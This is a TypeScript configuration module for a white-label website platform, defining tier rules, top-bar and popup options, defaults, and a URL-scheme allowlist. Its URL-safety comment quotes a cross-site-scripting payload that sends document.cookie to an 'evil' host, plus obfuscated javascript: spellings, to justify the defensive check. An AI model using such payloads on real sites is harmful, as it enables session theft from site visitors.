/**
 * ── The site-configuration option tables (White-label week · Day 2) ──────────
 *
 * Day 1 put every *branding* choice in `data/brandTheme.ts`. This is the same
 * idea for the four Day 2 switches: under-construction mode, the announcement
 * top bar, the promotional popup, and the "Powered by Funtush" badge.
 *
 * Same reasoning as `brandTheme.ts` for why this is a source file rather than
 * database rows — there is no tenant dimension (every agency sees the same three
 * popup triggers), the values are referenced by code and not merely displayed,
 * and changing one changes how live customer sites behave, which deserves a pull
 * request.
 *
 * What is *new* here, and what makes this file worth reading, is that it holds
 * the two **tier rules** of the day in one place each:
 *
 *   - `allowsPopupModal(tier)` — the popup is Medium and Large only.
 *   - `resolveFuntushBadge(tier, stored)` — forced on for the Free tier, off by
 *     default everywhere else.
 *
 * Both are pure functions of a tier name. They take no database handle and throw
 * nothing, so the service can call them, the tests can call them a hundred times
 * with no fixtures, and — importantly — the *read* path and the *write* path
 * cannot drift apart, because there is only one function.
 *
 * ⚠️ Like `brandTheme.ts`, this file must not import from `@funtush/database`.
 */

import type { TierName } from "./brandTheme";

/* ── 1. Tier rules ───────────────────────────────────────────────────────── */

/**
 * Tiers that get the promotional popup modal.
 *
 * Straight from the Day 2 task: *"Popup Modal config — Medium and Large tiers,
 * disabled by default"*. It is a marketing conversion tool, which is exactly the
 * kind of thing a growing agency upgrades for, and it is genuinely optional —
 * withholding it from Small breaks nothing, which is the test a feature must
 * pass before it is allowed to be a paid feature at all. (Compare: GPS and SOS
 * are never gated, Backend Guide §0.1.)
 */
export const POPUP_MODAL_TIERS: readonly TierName[] = ["MEDIUM", "LARGE"];

/** `true` when this tier may configure and show the popup modal. */
export function allowsPopupModal(tier: string): boolean {
  return POPUP_MODAL_TIERS.includes(tier as TierName);
}

/**
 * The 30-day trial sits on the tier row literally named `FREE`
 * (`packages/database/prisma/seed.ts`). Backend Guide §0.1 is emphatic that this
 * is a *trial*, not a free tier — but the row name is `FREE`, and renaming a
 * seeded tier is a migration, not a Day 2 job. This function is the single place
 * that knowledge lives, so the rename stays a one-line change.
 */
export function isTrialTier(tier: string): boolean {
  return tier === "FREE";
}

/**
 * Decide whether the "Powered by Funtush" badge renders.
 *
 * The Day 2 rule has two halves and they are not symmetric:
 *
 *   - **Free tier → forced on.** The badge is what the platform is paid in when
 *     it is not being paid in money. It is not a setting for a trial account, it
 *     is a term. So the stored preference is *ignored*, not merely defaulted —
 *     an agency that sets it to `false` and then downgrades to the trial gets the
 *     badge back automatically, with no cleanup job needed.
 *   - **Paid tiers → hidden by default.** They bought an unbranded site. `false`
 *     is the default, and `stored` may turn it back on for an agency that wants
 *     to credit the platform.
 *
 * Passing `null`/`undefined` for `stored` means "no row saved yet", which is the
 * state of every agency on its first day.
 *
 * @param tier   Tier name, e.g. `"FREE"`, `"LARGE"`.
 * @param stored The agency's saved preference, or `null` if it never set one.
 */
export function resolveFuntushBadge(tier: string, stored?: boolean | null): boolean {
  if (isTrialTier(tier)) return true;
  return stored ?? false;
}

/**
 * `true` when this tier is *allowed to change* the badge setting.
 *
 * Separate from `resolveFuntushBadge` on purpose. One answers "what renders?",
 * the other answers "may this request write?". Collapsing them into one function
 * that returns a boolean and also throws is how a read path ends up accidentally
 * rejecting requests.
 */
export function canToggleFuntushBadge(tier: string): boolean {
  return !isTrialTier(tier);
}

/* ── 2. Top bar ──────────────────────────────────────────────────────────── */

export type TopBarBehaviorId = "STATIC" | "SCROLLING";

export const TOP_BAR_BEHAVIORS = {
  STATIC: {
    id: "STATIC",
    label: "Static",
    description: "The text sits still, centred in the bar.",
  },
  SCROLLING: {
    id: "SCROLLING",
    label: "Scrolling",
    description: "The text marquees right-to-left. Use for longer notices.",
  },
} as const;

export const TOP_BAR_BEHAVIOR_IDS = Object.keys(TOP_BAR_BEHAVIORS) as TopBarBehaviorId[];

/**
 * How long an announcement may be.
 *
 * 160 characters — one SMS — is a deliberate borrow. It is a length people
 * already have an intuition for, it fits a `STATIC` bar on a desktop and a
 * `SCROLLING` bar on a phone, and it is short enough that nobody tries to put a
 * paragraph of terms and conditions in the header.
 */
export const MAX_TOP_BAR_TEXT_LENGTH = 160;

/* ── 3. Popup modal ──────────────────────────────────────────────────────── */

export type PopupTriggerId = "ON_LOAD" | "AFTER_DELAY" | "ON_EXIT_INTENT";

export const POPUP_TRIGGERS = {
  ON_LOAD: {
    id: "ON_LOAD",
    label: "Immediately on page load",
    description: "Highest reach, highest annoyance. Ignores the delay setting.",
  },
  AFTER_DELAY: {
    id: "AFTER_DELAY",
    label: "After a delay",
    description: "Waits `delaySeconds` before opening. The recommended default.",
  },
  ON_EXIT_INTENT: {
    id: "ON_EXIT_INTENT",
    label: "When the visitor is about to leave",
    description: "Desktop only — a renderer must fall back to a delay on touch devices.",
  },
} as const;

export const POPUP_TRIGGER_IDS = Object.keys(POPUP_TRIGGERS) as PopupTriggerId[];

export type PopupFrequencyId = "EVERY_VISIT" | "ONCE_PER_SESSION" | "ONCE_PER_DAY" | "ONCE_EVER";

export const POPUP_FREQUENCIES = {
  EVERY_VISIT: { id: "EVERY_VISIT", label: "Every page view" },
  ONCE_PER_SESSION: { id: "ONCE_PER_SESSION", label: "Once per browsing session" },
  ONCE_PER_DAY: { id: "ONCE_PER_DAY", label: "Once per day" },
  ONCE_EVER: { id: "ONCE_EVER", label: "Once, ever" },
} as const;

export const POPUP_FREQUENCY_IDS = Object.keys(POPUP_FREQUENCIES) as PopupFrequencyId[];

/**
 * Bounds on the open delay, in seconds.
 *
 * The ceiling matters more than the floor. A 30-minute delay is not a
 * configuration, it is a popup that never fires, and the agency reports it as
 * "the popup is broken". 120 seconds is longer than almost any session, so
 * anything above it is a mistake worth catching at the form.
 */
export const MIN_POPUP_DELAY_SECONDS = 0;
export const MAX_POPUP_DELAY_SECONDS = 120;

/* ── 4. Text length limits ───────────────────────────────────────────────── */

/**
 * One table so the validation schema, the error messages and the settings UI's
 * character counters all read the same numbers. A limit that exists in two
 * places is a limit that will disagree with itself.
 */
export const SITE_TEXT_LIMITS = {
  constructionHeadline: { min: 2, max: 80 },
  constructionMessage: { min: 2, max: 500 },
  topBarText: { min: 1, max: MAX_TOP_BAR_TEXT_LENGTH },
  popupTitle: { min: 2, max: 80 },
  popupBody: { min: 2, max: 1000 },
  popupCtaLabel: { min: 1, max: 40 },
  url: { max: 2048 },
} as const;

/* ── 5. Defaults ─────────────────────────────────────────────────────────── */

/**
 * What a site does when the agency has never opened the Site Configuration
 * screen — which, on day one of a trial, is every agency.
 *
 * Every default here is the *quiet* one: the site is live, there is no bar, there
 * is no popup. A platform that ships a feature switched on has decided on its
 * customers' behalf what their website says, and it only takes one agency
 * discovering an announcement bar it never wrote to make that a very bad day.
 */
export const DEFAULT_SITE_CONFIG = {
  underConstruction: false,
  topBarEnabled: false,
  topBarBehavior: "STATIC" as TopBarBehaviorId,
  topBarDismissible: true,
  popupEnabled: false,
  popupTrigger: "AFTER_DELAY" as PopupTriggerId,
  popupDelaySeconds: 5,
  popupFrequency: "ONCE_PER_SESSION" as PopupFrequencyId,
  showFuntushBadge: false,
} as const;

/**
 * Copy for the coming-soon page when the agency did not write its own.
 *
 * Deliberately says nothing about *why*. "We are updating our site" is true of
 * every reason an agency flips this switch — a redesign, a season ending, a
 * dispute — whereas "temporarily closed" or "under maintenance" is a guess that
 * is sometimes wrong and always the platform putting words in a customer's
 * mouth.
 */
export const DEFAULT_CONSTRUCTION_COPY = {
  headline: "We'll be back soon",
  message: "We're updating our website. Please check back shortly.",
} as const;

/* ── 6. URL safety ───────────────────────────────────────────────────────── */

/**
 * The only URL schemes a top-bar link or a popup button may use.
 *
 * This is the single most security-relevant line in the Day 2 code, so it is
 * worth being explicit about the attack. Both of these fields end up as an
 * `href` on the agency's public site. `href="javascript:fetch('https://evil…'+
 * document.cookie)"` is a working cross-site-scripting payload that needs no
 * `<script>` tag and survives every HTML-escaping function ever written, because
 * escaping protects the *text* of an attribute, not its *meaning*.
 *
 * A whitelist of two schemes closes it completely. `data:` is excluded too — a
 * `data:text/html` URL is the same attack wearing a different hat.
 */
export const ALLOWED_LINK_PROTOCOLS: readonly string[] = ["http:", "https:"];

/**
 * `true` when `value` is a URL a browser may safely be pointed at.
 *
 * Uses the platform `URL` parser rather than a regular expression on purpose.
 * Browsers tolerate `java\tscript:alert(1)`, `JaVaScRiPt:`, and a dozen other
 * spellings; hand-written regexes historically do not, and every one of those
 * mismatches has been a real vulnerability somewhere. Parsing with the same
 * algorithm the browser uses, then comparing the *parsed* protocol, has no such
 * gap.
 */
export function isSafeLinkUrl(value: string): boolean {
  try {
    const url = new URL(value);
    return ALLOWED_LINK_PROTOCOLS.includes(url.protocol);
  } catch {
    // Not a URL at all (a relative path, a sentence, an empty string).
    return false;
  }
}
